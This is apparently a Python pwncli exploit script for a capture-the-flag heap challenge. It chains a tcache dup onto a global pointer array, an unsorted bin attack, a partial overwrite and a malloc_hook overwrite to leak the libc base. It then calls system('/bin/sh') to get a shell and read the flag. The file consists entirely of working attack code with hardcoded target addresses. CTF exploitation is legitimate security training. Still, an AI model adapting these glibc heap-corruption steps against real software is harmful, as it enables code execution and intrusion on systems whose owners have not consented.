#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="dead", is_attack=False):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size: ", str(size))
    if is_attack:
        return
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index: ", str(idx))


def update(idx, size, data, is_attack=False):
    if is_attack:
        p.sendline("3")
    else:
        p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


"""
1. tcache dup to 0x601040
2. unsorted bin attack
3. partial overwrite
4. change malloc_hook to plt
5. leak addr
6. get shell
"""


heap_array_addr = 0x601030
write_addr = 0x40072c


add(0x420) # 0
add(0x20) # 1

# tcache dup
delete(1)
update(1, 0x8, p64(heap_array_addr))
add(0x20) # 2
add(0x20) # 3

# unsortedbin attack
delete(0)
update(0, 0x10, b"a"*8+p64(heap_array_addr))

add(0x420) # 4
update(3, 0x11, "a"*0x10+"\x30")

update(0, 8, p64(write_addr))

add(6295472, is_attack=True)

m = p.recvn(8)
libc_base_addr = u64_ex(m) - libc.sym['free']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

update(3, 0x8, b"/bin/sh\x00"+p64(0), True)
update(0, 8, p64(libc.sym['system']))

add(6295600, is_attack=True)

get_flag_when_get_shell(p)

p.interactive()